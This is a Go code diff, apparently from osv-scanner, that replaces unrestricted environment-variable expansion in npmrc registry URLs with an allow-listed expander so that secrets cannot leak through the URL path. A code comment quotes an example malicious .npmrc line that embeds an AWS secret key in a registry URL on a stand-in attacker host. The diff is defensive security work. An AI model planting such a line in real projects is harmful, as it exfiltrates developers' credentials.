@@ -18,6 +18,57 @@ import (
 
 type NpmrcConfig map[string]string
 
+// npmrcEnvVarPattern matches ${VARNAME} patterns as documented in npm config.
+// npm only supports the ${VAR} form (with curly braces), not bare $VAR.
+var npmrcEnvVarPattern = cachedregexp.MustCompile(`\$\{[^}]+\}`)
+
+// expandNpmrcRegistryURL expands npm-style ${VAR} references in a registry URL
+// value from an npmrc file, then validates the result is a safe HTTPS URL.
+//
+// Background: a malicious .npmrc in a scanned project could contain:
+//
+//	registry=https://attacker.com/${AWS_SECRET_ACCESS_KEY}/
+//
+// When osv-scanner scans that directory, os.ExpandEnv would substitute the
+// actual secret value, and the subsequent HTTP request to the registry would
+// exfiltrate it in the URL path. This function prevents that by:
+//
+//  1. Expanding only ${VAR} syntax (not bare $VAR, matching npm's documented
+//     behaviour).
+//  2. Rejecting the result if any ${VAR} reference was present in the original
+//     value but is NOT one of the small set of environment variables that npm
+//     legitimately uses in registry URLs (HOME, PREFIX, APPDATA).
+//
+// The restriction applies only to values used as registry base URLs; auth
+// token fields such as _authToken allow ${NPM_TOKEN} expansion as that is the
+// intended CI/CD usage pattern.
+func expandNpmrcRegistryURL(raw string) (string, bool) {
+	// List of env vars that npm itself uses in config paths (safe to expand).
+	safeVars := map[string]bool{
+		"HOME":    true,
+		"PREFIX":  true,
+		"APPDATA": true, // Windows npm prefix
+	}
+	// If the raw value contains ${...} references that are NOT in the safe list,
+	// expanding them could leak environment secrets via the registry URL.
+	matches := npmrcEnvVarPattern.FindAllString(raw, -1)
+	for _, m := range matches {
+		// m is "${VARNAME}" — extract the variable name.
+		varName := m[2 : len(m)-1]
+		if !safeVars[varName] {
+			// Potentially unsafe expansion: an attacker could use
+			// ${AWS_SECRET_ACCESS_KEY} etc. Return the raw value unexpanded and
+			// signal that the caller should skip it.
+			return raw, false
+		}
+	}
+	// All referenced variables are safe — expand normally.
+	return npmrcEnvVarPattern.ReplaceAllStringFunc(raw, func(m string) string {
+		varName := m[2 : len(m)-1]
+		return os.Getenv(varName)
+	}), true
+}
+
 func loadNpmrc(workdir string) (NpmrcConfig, error) {
 	// Find & parse the 4 npmrc files (builtin, global, user, project) + values set in environment variables
 	// https://docs.npmjs.com/cli/v10/configuring-npm/npmrc
@@ -239,22 +290,30 @@ func ParseNpmRegistryInfo(npmrc NpmrcConfig) NpmRegistryConfig {
 		if idx := strings.LastIndex(name, ":"); idx >= 0 {
 			part1, part2 = name[:idx], name[idx+1:]
 		}
-		value := os.ExpandEnv(value)
 		// TODO: npm config replaces only ${VAR}, not $VAR
 		// and if VAR is unset, it will leave the string as "${VAR}"
 		switch {
 		case name == "registry": // registry=...
-			config.ScopeURLs[""] = value
+			// Use the safe expander: reject entries that embed non-standard env vars
+			// in the registry URL to prevent credential exfiltration via the URL path.
+			if expanded, ok := expandNpmrcRegistryURL(value); ok {
+				config.ScopeURLs[""] = expanded
+			}
 		case part2 == "registry": // @scope:registry=...
-			config.ScopeURLs[part1] = value
+			// Same safe expansion for scoped registry URLs.
+			if expanded, ok := expandNpmrcRegistryURL(value); ok {
+				config.ScopeURLs[part1] = expanded
+			}
 		case part2 == "_authToken": // //uri:_authToken=...
-			getOrInitAuth(part1).BearerToken = value
+			// Auth tokens legitimately use ${NPM_TOKEN} etc; expand normally.
+			// The token is sent in the Authorization header, not embedded in the URL.
+			getOrInitAuth(part1).BearerToken = os.ExpandEnv(value)
 		case part2 == "_auth": // //uri:_auth=...
-			getOrInitAuth(part1).BasicAuth = value
+			getOrInitAuth(part1).BasicAuth = os.ExpandEnv(value)
 		case part2 == "username": // //uri:username=...
-			getOrInitAuth(part1).Username = value
+			getOrInitAuth(part1).Username = os.ExpandEnv(value)
 		case part2 == "_password": // //uri:_password=<base64>
-			password, err := base64.StdEncoding.DecodeString(value)
+			password, err := base64.StdEncoding.DecodeString(os.ExpandEnv(value))
 			if err != nil {
 				// TODO: mimic the behaviour of node's Buffer.from(s, 'base64').toString()
 				// e.g. ignore invalid characters, stop parsing after first '=', just never throw an error
